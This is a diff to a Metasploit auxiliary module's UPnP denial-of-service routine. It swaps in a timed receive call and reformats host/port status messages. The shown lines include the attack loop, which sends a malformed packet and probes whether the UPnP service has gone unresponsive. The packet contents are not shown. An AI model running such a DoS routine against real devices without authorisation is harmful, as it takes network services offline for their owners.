@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def send_probe(udp_sock, probe)
     udp_sock.put(probe)
-    data = udp_sock.recvfrom
+    data = udp_sock.timed_recvfrom(65535)
     if data && !data[0].empty?
       return data[0]
     else
@@ -77,30 +77,30 @@ class MetasploitModule < Msf::Auxiliary
     # connect to the UDP port
     connect_udp
 
-    print_status("#{rhost}:#{rport} - Checking UPnP...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking UPnP...")
     response = send_probe(udp_sock, msearch_probe)
     if response.nil?
-      print_error("#{rhost}:#{rport} - UPnP end not found")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - UPnP end not found")
       disconnect_udp
       return
     end
 
     (1..datastore['ATTEMPTS']).each do |attempt|
-      print_status("#{rhost}:#{rport} - UPnP DoS attempt #{attempt}...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - UPnP DoS attempt #{attempt}...")
 
       # send the exploit to the target
-      print_status("#{rhost}:#{rport} - Sending malformed packet...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending malformed packet...")
       udp_sock.put(sploit)
 
       # send the probe to the target
-      print_status("#{rhost}:#{rport} - The target should be unresponsive now...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - The target should be unresponsive now...")
       response = send_probe(udp_sock, msearch_probe)
       if response.nil?
-        print_good("#{rhost}:#{rport} - UPnP unresponsive")
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - UPnP unresponsive")
         disconnect_udp
         break
       else
-        print_status("#{rhost}:#{rport} - UPnP is responsive still")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - UPnP is responsive still")
       end
     end
 
